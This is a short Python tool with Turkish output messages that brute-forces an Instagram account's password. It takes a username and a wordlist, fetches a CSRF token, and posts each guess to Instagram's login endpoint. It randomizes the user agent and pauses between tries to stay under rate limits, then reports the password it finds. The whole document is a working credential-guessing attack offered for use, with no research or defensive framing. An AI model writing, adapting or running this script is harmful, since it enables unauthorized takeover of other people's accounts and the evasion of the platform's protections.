import requests
import argparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import time

LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'

headers = {
    'User-Agent': UserAgent().random,
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.instagram.com/accounts/login/'
}

def try_login(username, password):
    session = requests.Session()
    session.headers.update(headers)

    # Get CSRF Token
    try:
        resp = session.get('https://www.instagram.com/accounts/login/')
        csrf_token = resp.cookies.get_dict().get('csrftoken')
        if not csrf_token:
            print("❌ CSRF token alınamadı!")
            return False
    except Exception as e:
        print(f"⚠️ Token alınırken hata: {e}")
        return False

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    session.headers.update({"X-CSRFToken": csrf_token})

    try:
        login_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True)
        if login_resp.status_code == 200:
            if login_resp.json().get('authenticated'):
                print(f"\n✅ Şifre bulundu: {password}")
                return True
            else:
                print(f"[-] Denendi: {password}")
                return False
        else:
            print(f"⚠️ HTTP {login_resp.status_code} hatası veya bot koruması!")
            return False
    except Exception as e:
        print(f"⚠️ Giriş isteği başarısız: {e}")
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', help='Instagram kullanıcı adı', required=True)
    parser.add_argument('-p', '--passwords', help='Wordlist dosya yolu', required=True)
    args = parser.parse_args()

    try:
        with open(args.passwords, 'r', encoding='utf-8') as file:
            for line in file:
                password = line.strip()
                if try_login(args.username, password):
                    print("\n✅ Giriş başarılı. Script durduruluyor.")
                    break
                time.sleep(5)  # Rate limit'e takılmamak için gecikme
    except FileNotFoundError:
        print("❌ Wordlist dosyası bulunamadı.")

if __name__ == '__main__':
    main()
